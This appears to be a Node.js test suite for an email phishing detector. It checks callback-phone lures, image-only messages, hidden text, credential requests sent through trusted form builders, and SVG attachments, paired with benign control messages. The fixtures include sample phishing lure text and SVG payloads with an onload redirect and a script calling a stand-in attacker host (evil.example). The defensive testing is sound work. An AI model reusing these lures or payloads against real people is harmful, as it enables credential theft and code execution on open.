const test = require('node:test');
const assert = require('node:assert');

const emailParser = require('../modules/emailParser');
const mqlBridge = require('../modules/mqlBridge');
const attachmentAnalyzer = require('../modules/attachmentAnalyzer');
const iocExtractor = require('../modules/iocExtractor');
const textDeception = require('../modules/textDeception');
const nlpAnalyzer = require('../modules/nlpAnalyzer');
const payloadChannel = require('../modules/payloadChannel');
const trustedServiceAbuse = require('../modules/trustedServiceAbuse');
const ruleEngine = require('../modules/ruleEngine');
const evidenceFusion = require('../modules/evidenceFusion');
const confidenceEngine = require('../modules/confidenceEngine');
const attachmentInspector = require('../modules/attachmentInspector');

/**
 * Detection for attacks built specifically to leave nothing to detect.
 *
 * Each family here shares one property: every other check in this system
 * scores it at or near zero, and not by accident. The callback message has no
 * link and no file because a gateway inspects links and files. The message
 * rendered as a picture has no text because the analysis reads text. The
 * platform-abuse message authenticates perfectly because authentication is
 * what the strongest evidence family here measures.
 *
 * So half of these tests assert that the new detection fires - and the other
 * half assert that it does not, on messages that look superficially the same
 * and are ordinary. That second half is the more important one. A detector for
 * "message contains a phone number" or "message contains a hidden div" would
 * pass the first half and flag a large share of real mail, and a phishing
 * detector that cries wolf is worse than one that misses, because it gets
 * switched off.
 */

const CRLF = String.fromCharCode(13, 10);
const buildRaw = (headers, body) => `${headers.join(CRLF)}${CRLF}${CRLF}${body}`;

const PASSING_AUTH = { spf: 'pass', dkim: 'pass', dmarc: 'pass', dmarc_policy: { status: 'UNAVAILABLE', policy: null } };

/** The offline portion of the pipeline, in the order server.js runs it. */
async function runPipeline(raw, authentication = PASSING_AUTH) {
    const parsedEmail = await emailParser.parse(raw);
    let threatObject = mqlBridge.normalize(parsedEmail, null, raw);
    threatObject.forensics.authentication = authentication;
    threatObject = await attachmentAnalyzer.analyze(threatObject, parsedEmail);
    threatObject = iocExtractor.extract(threatObject, parsedEmail);
    threatObject = textDeception.analyze(threatObject, parsedEmail);
    threatObject = nlpAnalyzer.analyze(threatObject, parsedEmail);
    threatObject = payloadChannel.analyze(threatObject, parsedEmail);
    threatObject = trustedServiceAbuse.analyze(threatObject, parsedEmail);
    threatObject = ruleEngine.evaluate(threatObject, parsedEmail);
    threatObject = evidenceFusion.fuse(threatObject);
    threatObject = confidenceEngine.calculate(threatObject);
    return threatObject;
}

const ruleIds = t => (t.detection?.matched_rules || []).map(r => r.id);

// ---------------------------------------------------------------------------
// Telephone-oriented attack delivery
// ---------------------------------------------------------------------------

test('a message whose only payload is a phone number is recognised', async () => {
    // No link, no attachment, valid authentication, sent from a real provider.
    // There is nothing here for a gateway to detonate or reputation-check,
    // which is the entire design of the attack.
    const raw = buildRaw([
        'From: "Billing Department" <notices@mail-service.example>',
        'To: employee@company.example',
        'Subject: Your subscription renews today - USD 429.99',
        'Message-ID: <toad1@mail-service.example>',
        'Date: Mon, 21 Sep 2026 09:00:00 +0000',
        'Content-Type: text/plain; charset=utf-8'
    ], [
        'Thank you for your order.',
        '',
        'Your annual plan renews today and the amount of USD 429.99 will be charged',
        'to the card on file. This charge cannot be reversed once processed.',
        '',
        'If you did not authorise this, call our billing department immediately',
        'on +1 (888) 555-0199 to cancel before it is processed.'
    ].join(CRLF));

    const result = await runPipeline(raw);

    assert.strictEqual(result.payload_channel.phone_is_only_channel, true,
        'the telephone number is the only thing to act on');
    assert.ok(result.payload_channel.phone_numbers.length, 'the number must be recorded so a case can quote it');

    const ids = ruleIds(result);
    assert.ok(ids.includes('MQL-TOAD-101'), 'the shape must be detected');
    assert.ok(ids.includes('MQL-TOAD-102'),
        'a billing alarm with a number and no link is the standard callback lure');

    // The point of the family cap: this has to be able to reach a verdict
    // without help from authentication, links or attachments, because it has
    // none of them.
    assert.notStrictEqual(result.detection.verdict, 'SAFE',
        'a message built so nothing else can see it must not come back clean');
});

test('an ordinary message that happens to contain a phone number is not flagged', async () => {
    // The false positive that would matter most. Signatures and support
    // footers carry phone numbers constantly; scoring a message for having one
    // would flag a large share of ordinary business mail.
    const raw = buildRaw([
        'From: "Priya Raghavan" <priya@supplier.example>',
        'To: employee@company.example',
        'Subject: Re: Thursday delivery',
        'Message-ID: <normal1@supplier.example>',
        'In-Reply-To: <thread-root@company.example>',
        'Date: Mon, 21 Sep 2026 09:00:00 +0000',
        'Content-Type: text/plain; charset=utf-8'
    ], [
        'That works for us. The van should reach you before eleven.',
        '',
        'Best regards,',
        'Priya Raghavan',
        'Logistics Coordinator',
        'Call me on +1 (415) 555-0142 if anything changes.',
        'https://supplier.example/contact'
    ].join(CRLF));

    const result = await runPipeline(raw);

    assert.strictEqual(result.payload_channel.phone_is_only_channel, false,
        'a number alongside a link is not a callback lure');

    const ids = ruleIds(result);
    assert.ok(!ids.includes('MQL-TOAD-101'), 'a signature phone number must not fire the rule');
    assert.ok(!ids.includes('MQL-TOAD-102'));
});

test('a number with nothing asking the reader to ring it is not a call to action', () => {
    // An invoice total, an order reference and a date all match number-shaped
    // patterns. Requiring calling language nearby is what separates them.
    const found = payloadChannel.findCallToActionNumbers(
        'Order 555-0199-2026 shipped on 2026-09-21. Reference 888 555 0199 for your records.'
    );
    assert.deepStrictEqual(found, [], 'a reference number is not a telephone number to ring');
});

// ---------------------------------------------------------------------------
// The message is a picture
// ---------------------------------------------------------------------------

test('a message that is one clickable image with no readable text is recognised', async () => {
    const raw = buildRaw([
        'From: "Accounts" <no-reply@billing-notice.example>',
        'To: employee@company.example',
        'Subject: Invoice',
        'Message-ID: <img1@billing-notice.example>',
        'Date: Mon, 21 Sep 2026 09:00:00 +0000',
        'Content-Type: text/html; charset=utf-8'
    ], '<html><body><a href="https://collect.example/pay"><img src="https://cdn.example/invoice.png" width="600" height="800"></a></body></html>');

    const result = await runPipeline(raw);

    assert.strictEqual(result.payload_channel.body_is_image_only, true);
    const ids = ruleIds(result);
    assert.ok(ids.includes('MQL-IMG-101'), 'an unreadable body must be reported as unreadable');
    assert.ok(ids.includes('MQL-IMG-102'), 'an image-only body carrying a link is the phishing shape');

    // And the reason this matters: the language analysis found nothing,
    // because there was nothing to find.
    assert.strictEqual((result.nlp?.signals || []).length, 0,
        'this test is only meaningful while the text analysis is blind to it');
});

test('an image-led newsletter with real text is not flagged', async () => {
    // Marketing mail is image-heavy by nature. The signal is the absence of
    // text, not the presence of pictures.
    const body = '<html><body><img src="https://cdn.example/header.png">'
        + '<p>Our autumn timetable is now published. Trains to the coast run hourly from '
        + 'the fourth of October, with the last service leaving at half past eleven. Seat '
        + 'reservations open two weeks in advance and are included in the standard fare. '
        + 'Weekend engineering work continues through November on the northern line, and '
        + 'replacement buses will run from the station forecourt.</p>'
        + '<a href="https://rail.example/timetable">Read the full timetable</a></body></html>';

    const result = await runPipeline(buildRaw([
        'From: "Coastal Rail" <news@rail.example>',
        'To: employee@company.example',
        'Subject: Autumn timetable',
        'Message-ID: <news1@rail.example>',
        'Date: Mon, 21 Sep 2026 09:00:00 +0000',
        'Content-Type: text/html; charset=utf-8'
    ], body));

    assert.strictEqual(result.payload_channel.image_dominant, false,
        'an image with substantial text beside it is an ordinary newsletter');
    assert.ok(!ruleIds(result).includes('MQL-IMG-101'));
    assert.ok(!ruleIds(result).includes('MQL-IMG-102'));
});

// ---------------------------------------------------------------------------
// Text hidden from the reader
// ---------------------------------------------------------------------------

test('bulk text hidden from the reader is reported', () => {
    const padding = 'The quarterly report has been circulated to all departments for review. '.repeat(12);
    const html = `<html><body><div style="display:none;font-size:0">${padding}</div>`
        + '<p>Confirm your password to keep your mailbox active.</p></body></html>';

    const found = textDeception.findConcealedMarkup(html);
    assert.ok(found.concealed_characters > 400, 'the hidden block must be measured');
    assert.ok(found.techniques.length, 'the technique used must be named');
});

test('an ordinary preheader is not reported as concealed text', async () => {
    // Nearly every marketing email sets a short line to display:none so the
    // client shows it as a preview. Reporting that would flag most legitimate
    // bulk mail ever sent, which is why the threshold is a ratio and not a
    // presence check.
    const html = '<html><body><span style="display:none">Your order has shipped</span>'
        + '<p>Hello, your parcel left our depot this morning and should arrive on Thursday. '
        + 'You can follow it using the tracking number in your account, and the courier will '
        + 'send a text message on the morning of delivery with a two-hour window.</p></body></html>';

    const result = await runPipeline(buildRaw([
        'From: "Dispatch" <ship@store.example>',
        'To: employee@company.example',
        'Subject: Your order has shipped',
        'Message-ID: <pre1@store.example>',
        'Date: Mon, 21 Sep 2026 09:00:00 +0000',
        'Content-Type: text/html; charset=utf-8'
    ], html));

    assert.strictEqual(result.text_deception.concealed_markup.substantial, false,
        'a preheader is not an evasion technique');
    assert.ok(!ruleIds(result).includes('MQL-DECEPT-105'));
});

// ---------------------------------------------------------------------------
// Abuse of services nobody can block
// ---------------------------------------------------------------------------

test('credentials requested through a public form builder reaches high risk on its own', async () => {
    // Everything about the delivery is genuine, so the authentication family -
    // the strongest evidence in this system - contributes nothing. This is the
    // case the decisive floor exists for.
    const raw = buildRaw([
        'From: "IT Service Desk" <notifications@mail-service.example>',
        'To: employee@company.example',
        'Subject: Mailbox storage verification',
        'Message-ID: <lots1@mail-service.example>',
        'Date: Mon, 21 Sep 2026 09:00:00 +0000',
        'Content-Type: text/plain; charset=utf-8'
    ], [
        'Your mailbox is close to its storage limit.',
        'Please confirm your password using the form below to keep your account active.',
        'https://forms.office.com/r/aB3dEf9hKl'
    ].join(CRLF));

    const result = await runPipeline(raw, PASSING_AUTH);

    assert.strictEqual(result.trusted_service.credentials_via_form_builder, true);
    assert.ok(ruleIds(result).includes('MQL-LOTS-101'));

    assert.strictEqual(result.detection.verdict, 'HIGH_RISK',
        'nobody collects passwords through a form builder; this must not need corroboration');

    const floor = result.confidence.contributions.find(c => c.family === 'DECISIVE_FINDING');
    assert.ok(floor, 'and the reason it got there must be visible rather than silent');
});

test('a genuine form link with no credential request is left alone', async () => {
    // Form builders are used legitimately all day long. The finding is the
    // combination with a password request, never the platform by itself.
    const raw = buildRaw([
        'From: "Events" <events@partner.example>',
        'To: employee@company.example',
        'Subject: Conference catering preferences',
        'Message-ID: <form2@partner.example>',
        'Date: Mon, 21 Sep 2026 09:00:00 +0000',
        'Content-Type: text/plain; charset=utf-8'
    ], [
        'Please let us know your catering preference for the October session.',
        'https://forms.office.com/r/zZ9yXw1vUt'
    ].join(CRLF));

    const result = await runPipeline(raw, PASSING_AUTH);

    assert.strictEqual(result.trusted_service.credentials_via_form_builder, false);
    assert.ok(!ruleIds(result).includes('MQL-LOTS-101'));
    assert.strictEqual(result.detection.verdict, 'SAFE',
        'a catering form must not be treated as credential phishing');
});

test('a brand claimed by a message that a different platform delivered is reported', async () => {
    const raw = buildRaw([
        'From: "Microsoft Account Team" <bounce@sendgrid.net>',
        'To: employee@company.example',
        'Subject: Unusual sign-in activity on your Microsoft account',
        'Message-ID: <lots3@sendgrid.net>',
        'Date: Mon, 21 Sep 2026 09:00:00 +0000',
        'Content-Type: text/plain; charset=utf-8'
    ], [
        'We detected an unusual sign-in to your Microsoft account.',
        'Review the activity and confirm your identity to secure your account.'
    ].join(CRLF));

    const result = await runPipeline(raw, PASSING_AUTH);

    assert.ok(result.trusted_service.brand_platform_mismatch,
        'a Microsoft security alert does not leave through a bulk sender');
    assert.ok(ruleIds(result).includes('MQL-LOTS-102'));
});

test('a brand sending its own mail is not a mismatch', async () => {
    const raw = buildRaw([
        'From: "Microsoft account team" <account-security@microsoft.com>',
        'To: employee@company.example',
        'Subject: Your Microsoft account security info was added',
        'Message-ID: <real1@microsoft.com>',
        'Date: Mon, 21 Sep 2026 09:00:00 +0000',
        'Content-Type: text/plain; charset=utf-8'
    ], 'Security info was added to your Microsoft account. If this was you, no action is needed.');

    const result = await runPipeline(raw, PASSING_AUTH);

    assert.strictEqual(result.trusted_service.brand_platform_mismatch, null);
    assert.ok(!ruleIds(result).includes('MQL-LOTS-102'));
});

// ---------------------------------------------------------------------------
// SVG attachments
// ---------------------------------------------------------------------------

test('an SVG that runs code the moment it opens is decisive', async () => {
    const svg = Buffer.from(
        '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="window.location=atob(\'aHR0cHM6Ly9ldmlsLmV4YW1wbGU=\')">'
        + '<rect width="100" height="100"/></svg>'
    );

    const inspection = await attachmentInspector.inspect(svg, {
        fileName: 'voicemail-transcript.svg',
        declaredMimeType: 'image/svg+xml'
    });

    const codes = inspection.findings.map(f => f.code);
    assert.ok(codes.includes('SVG_EVENT_HANDLER'), 'onload is code that runs with no interaction');

    const handler = inspection.findings.find(f => f.code === 'SVG_EVENT_HANDLER');
    assert.strictEqual(handler.decisive, true, 'an image has no reason to execute anything on open');
});

test('an SVG mislabelled as plain text is reported for the mislabelling', async () => {
    // The documented evasion: declare text/plain so scanners routing by MIME
    // type never treat the content as markup.
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.example")</script></svg>');

    const inspection = await attachmentInspector.inspect(svg, {
        fileName: 'missed-call.svg',
        declaredMimeType: 'text/plain'
    });

    const codes = inspection.findings.map(f => f.code);
    assert.ok(codes.includes('SVG_DECLARED_AS_ANOTHER_TYPE'),
        'the file says it is an SVG and the message says it is text; that disagreement is deliberate');
    assert.ok(codes.includes('SVG_SCRIPT_ELEMENT'));
});

test('a plain vector graphic is not treated as active content', async () => {
    const svg = Buffer.from(
        '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="120" height="60">'
        + '<rect width="120" height="60" fill="#1f6feb"/><text x="10" y="35" fill="white">Logo</text></svg>'
    );

    const inspection = await attachmentInspector.inspect(svg, {
        fileName: 'logo.svg',
        declaredMimeType: 'image/svg+xml'
    });

    const svgFindings = inspection.findings.filter(f => f.code.startsWith('SVG_'));
    assert.deepStrictEqual(svgFindings, [], 'an ordinary logo must produce nothing at all');
});

// ---------------------------------------------------------------------------
// The scoring that makes the above reachable
// ---------------------------------------------------------------------------

test('the new families are declared rather than falling through to the default', () => {
    const familyOf = type => confidenceEngine.evidenceFamily({ evidence_type: type });

    assert.strictEqual(familyOf('MQL_TOAD'), 'PAYLOAD_CHANNEL');
    assert.strictEqual(familyOf('MQL_IMAGE'), 'PAYLOAD_CHANNEL');
    assert.strictEqual(familyOf('MQL_LOTS'), 'TRUSTED_SERVICE');
    assert.strictEqual(familyOf('MQL_DECEPTION'), 'DECEPTION');

    // This one was a real defect rather than a new family: the AUTHFLOW rules
    // carried a comment placing them in URL_RISK and nothing mapped them, so
    // they formed a family of their own and counted as independent of the URL
    // findings they are not independent of.
    assert.strictEqual(familyOf('MQL_AUTHFLOW'), 'URL_RISK',
        'device-code links are link risk; they must not be counted twice');
    assert.strictEqual(familyOf('MQL_QR'), 'URL_RISK', 'a QR code resolves to a URL');
});

// ---------------------------------------------------------------------------
// Technique attribution
// ---------------------------------------------------------------------------

test('every rule declares its techniques, or deliberately declares none', () => {
    const fs = require('fs');
    const path = require('path');
    const source = fs.readFileSync(path.join(__dirname, '..', 'modules', 'ruleEngine.js'), 'utf8');
    const lines = source.split('\n');

    const marks = lines
        .map((line, index) => ({ index, id: (line.match(/id: '(MQL-[^']+)'/) || [])[1] }))
        .filter(m => m.id);

    const withoutTechniques = [];
    marks.forEach((mark, n) => {
        const end = n + 1 < marks.length ? marks[n + 1].index : lines.length;
        const block = lines.slice(mark.index, end).join('\n');
        if (!/mitre: \[/.test(block)) withoutTechniques.push(mark.id);
    });

    // Three, and only these three. Each observes something that frequently
    // accompanies phishing rather than the technique itself: misconfigured
    // legitimate senders omit a Message-ID, newsletters carry many links, and
    // an archive attachment is not obfuscation.
    //
    // This list is short on purpose. All three briefly carried techniques, and
    // the test asserting that an ordinary message attributes none caught it -
    // an attribution hung on a weak correlate turns a technique identifier into
    // decoration.
    assert.deepStrictEqual(withoutTechniques.sort(), [
        'MQL-ATT-104',
        'MQL-AUTH-103',
        'MQL-URL-104'
    ], 'a rule either observes a technique or attributes none; this list must not grow quietly');
});

test('every technique a rule cites has a name to render', () => {
    const fs = require('fs');
    const path = require('path');
    const source = fs.readFileSync(path.join(__dirname, '..', 'modules', 'ruleEngine.js'), 'utf8');

    const cited = new Set(
        [...source.matchAll(/mitre: \[([^\]]*)\]/g)]
            .flatMap(m => m[1].match(/T1[0-9.]+/g) || [])
    );

    const nameMap = source.slice(source.indexOf('TECHNIQUE_NAMES = {'));
    const unnamed = [...cited].filter(t => !nameMap.includes(`'${t}':`));

    // A bare technique number in a report is an assertion. The name is what
    // lets somebody check whether the attribution is reasonable.
    assert.deepStrictEqual(unnamed, [], 'a cited technique with no name renders as a bare number');
    assert.ok(cited.size >= 12, 'coverage should not silently collapse to a couple of techniques');
});
